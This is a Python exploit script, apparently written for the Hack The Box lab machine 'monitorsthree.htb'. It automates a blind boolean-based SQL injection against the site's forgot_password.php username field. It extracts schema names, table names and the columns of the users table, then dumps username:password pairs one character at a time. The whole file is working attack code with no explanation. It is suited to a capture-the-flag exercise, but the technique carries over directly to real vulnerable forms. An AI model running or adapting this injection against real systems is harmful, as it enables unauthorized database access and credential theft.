from pwn import *
import requests, sys, signal

def def_handler(sig, frame):
	print("[!] Exit...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://monitorsthree.htb/forgot_password.php"

headers = {
	"Content-Type": "application/x-www-form-urlencoded"
}

chars = [chr(i) for i in range(32, 127)]

result = ""
iterator = 0
option = 4

p1 = log.progress("Result")

while True:
	iterator += 1
	finded = False
	for i in range(32, 127):
		if option == 1:
			data = {
        			"username": "' union select * from (select(select ascii(substring(group_concat(schema_name), %d, 1)) from information_schema.schemata) as t,2,3,4,5,6,7,8,9) as temp where temp.t = %d-- -" % (iterator, i)
			}
		elif option == 2:
			data = {
                                "username": "' union select * from (select(select ascii(substring(group_concat(table_name), %d, 1)) from information_schema.tables where table_schema = 'monitorsthree_db') as t,2,3,4,5,6,7,8,9) as temp where temp.t = %d-- -" % (iterator, i)
                        }
		elif option == 3:
			data = {
				"username": "' union select * from (select(select ascii(substring(group_concat(column_name), %d, 1)) from information_schema.columns where table_schema = 'monitorsthree_db' and table_name = 'users') as t,2,3,4,5,6,7,8,9) as temp where temp.t = %d-- -" % (iterator, i)
			}
		elif option == 4:
			data = {
                                "username": "' union select * from (select(select ascii(substring(group_concat(username,':',password), %d, 1)) from monitorsthree_db.users) as t,2,3,4,5,6,7,8,9) as temp where temp.t = %d-- -" % (iterator, i)
                        }


		response = requests.post(url, headers=headers, data=data)

		p1.status(result + chr(i))

		if not "Unable to process request, try again!" in response.text:
			result += chr(i)
			p1.status(result)
			finded = True
			break
	if finded is False:
		p1.status(result)
		break
